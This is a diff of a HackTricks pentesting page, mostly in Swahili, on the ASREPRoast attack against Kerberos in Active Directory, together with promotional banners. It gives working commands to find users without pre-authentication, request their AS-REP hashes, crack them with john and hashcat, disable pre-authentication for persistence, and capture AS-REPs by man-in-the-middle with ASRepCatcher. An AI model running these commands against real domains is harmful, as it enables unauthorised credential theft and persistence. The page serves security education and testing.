@@ -1,45 +1,48 @@
 # ASREPRoast
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa zawadi za mdudu!
+Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
-**Machapisho Kuhusu Kudukua**\
-Shiriki na maudhui yanayochimba kwenye msisimko na changamoto za kudukua
+**Hacking Insights**\
+Engage with content that delves into the thrill and challenges of hacking
 
-**Taarifa za Kudukua Halisi**\
-Kaa sawa na ulimwengu wa kudukua wenye kasi kupitia taarifa za wakati halisi na ufahamu
+**Real-Time Hack News**\
+Keep up-to-date with fast-paced hacking world through real-time news and insights
 
-**Matangazo ya Karibuni**\
-Baki mwelekezi na zawadi mpya za mdudu zinazoanzishwa na sasisho muhimu za jukwaa
+**Latest Announcements**\
+Stay informed with the newest bug bounties launching and crucial platform updates
 
-**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!
+**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
 ## ASREPRoast
 
-ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa inayohitajika ya kabla ya uthibitishaji wa Kerberos**. Kimsingi, udhaifu huu huruhusu wadukuzi kuomba uthibitisho kwa mtumiaji kutoka kwa Msimamizi wa Kikoa (DC) bila kuhitaji nywila ya mtumiaji. DC kisha hujibu kwa ujumbe uliofichwa kwa ufunguo uliochotwa kutoka kwa nywila ya mtumiaji, ambao wadukuzi wanaweza kujaribu kuvunja nje ya mtandao ili kugundua nywila ya mtumiaji.
+ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa inayohitajika ya Kerberos pre-authentication**. Kimsingi, udhaifu huu unaruhusu washambuliaji kuomba uthibitisho kwa mtumiaji kutoka kwa Domain Controller (DC) bila kuhitaji nenosiri la mtumiaji. DC kisha inajibu kwa ujumbe uliofungwa kwa kutumia funguo iliyotokana na nenosiri la mtumiaji, ambayo washambuliaji wanaweza kujaribu kuifungua bila mtandao ili kugundua nenosiri la mtumiaji.
 
-Mahitaji muhimu kwa shambulio hili ni:
+Mahitaji makuu ya shambulio hili ni:
 
-* **Ukosefu wa kabla ya uthibitishaji wa Kerberos**: Watumiaji walengwa lazima wasiwe na kipengele hiki cha usalama kimezimwa.
-* **Unganisho na Msimamizi wa Kikoa (DC)**: Wadukuzi wanahitaji ufikiaji wa DC kutuma maombi na kupokea ujumbe uliofichwa.
-* **Akaunti ya kikoa inayoweza**: Kuwa na akaunti ya kikoa inaruhusu wadukuzi kutambua watumiaji walio hatarini kwa ufanisi zaidi kupitia mizizi ya LDAP. Bila akaunti kama hiyo, wadukuzi lazima wapate majina ya mtumiaji kwa kubahatisha.
+* **Ukosefu wa Kerberos pre-authentication**: Watumiaji wa lengo hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
+* **Muunganisho na Domain Controller (DC)**: Washambuliaji wanahitaji ufikiaji wa DC ili kutuma maombi na kupokea ujumbe uliofungwa.
+* **Akaunti ya kikoa ya hiari**: Kuwa na akaunti ya kikoa kunawawezesha washambuliaji kutambua kwa ufanisi watumiaji walio hatarini kupitia maswali ya LDAP. Bila akaunti kama hiyo, washambuliaji lazima wahisi majina ya watumiaji.
 
-#### Kuhesabu watumiaji walio hatarini (inahitaji sifa za kikoa)
+#### Kuorodhesha watumiaji walio hatarini (hitaji akreditif za kikoa)
+
+{% code title="Using Windows" %}
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -68,17 +71,19 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-Kuchemsha AS-REP na Rubeus kutazalisha 4768 na aina ya kuchapisha ya 0x17 na aina ya awali ya 0.
+AS-REP Roasting na Rubeus itazalisha 4768 na aina ya usimbaji wa 0x17 na aina ya preauth ya 0.
 {% endhint %}
 
-### Kuvunja
+### Kupasua
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
-### Uthabiti
+### Persistence
 
-Lazima **preauth** isihitajike kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali):
+Lazimisha **preauth** isiyohitajika kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali):
+
+{% code title="Using Windows" %}
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -88,9 +93,12 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
-## ASREProast bila sifa za kujiandikisha
+{% endcode %}
 
-Mshambuliaji anaweza kutumia nafasi ya mtu katikati kuteka pakiti za AS-REP wanapopita kwenye mtandao bila kutegemea kufungwa kwa uthibitishaji wa mapema wa Kerberos. Kwa hivyo, inafanya kazi kwa watumiaji wote kwenye VLAN. [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inaruhusu kutenda hivyo. Zaidi ya hayo, zana hiyo inalazimisha vituo vya kazi vya wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
+## ASREProast bila akreditivu
+
+Mshambuliaji anaweza kutumia nafasi ya mtu katikati kukamata pakiti za AS-REP wakati zinapita kwenye mtandao bila kutegemea kuwa Kerberos pre-authentication imezimwa. Hivyo inafanya kazi kwa watumiaji wote kwenye VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatupa uwezo wa kufanya hivyo. Zaidi ya hayo, chombo hiki kinawalazimisha vituo vya wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -101,7 +109,7 @@ ASRepCatcher relay -dc $DC_IP --disable-spoofing
 # Passive listening of AS-REP packets, no packet alteration
 ASRepCatcher listen
 ```
-## Marejeo
+## References
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
@@ -109,29 +117,30 @@ ASRepCatcher listen
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuzungumza na wakorofi wenye uzoefu na wawindaji wa tuzo za mdudu!
+Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server kuwasiliana na hackers wenye uzoefu na wawindaji wa bug bounty!
 
-**Machapisho ya Udukuzi**\
-Shiriki na maudhui yanayochimba kina kuhusu msisimko na changamoto za udukuzi
+**Hacking Insights**\
+Shiriki na maudhui yanayochunguza msisimko na changamoto za hacking
 
-**Taarifa za Udukuzi za Wakati Halisi**\
-Kaa up-to-date na ulimwengu wa udukuzi wenye kasi kupitia taarifa za habari za wakati halisi
+**Real-Time Hack News**\
+Baki na habari za hivi punde katika ulimwengu wa hacking kupitia habari na maarifa ya wakati halisi
 
-**Matangazo Mapya**\
-Baki mwelekezwa na tuzo za mdudu zinazoanzishwa na sasisho muhimu za jukwaa
+**Latest Announcements**\
+Baki na taarifa kuhusu bug bounties mpya zinazozinduliwa na masasisho muhimu ya jukwaa
 
-**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wakorofi bora leo!
+**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na hackers bora leo!
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
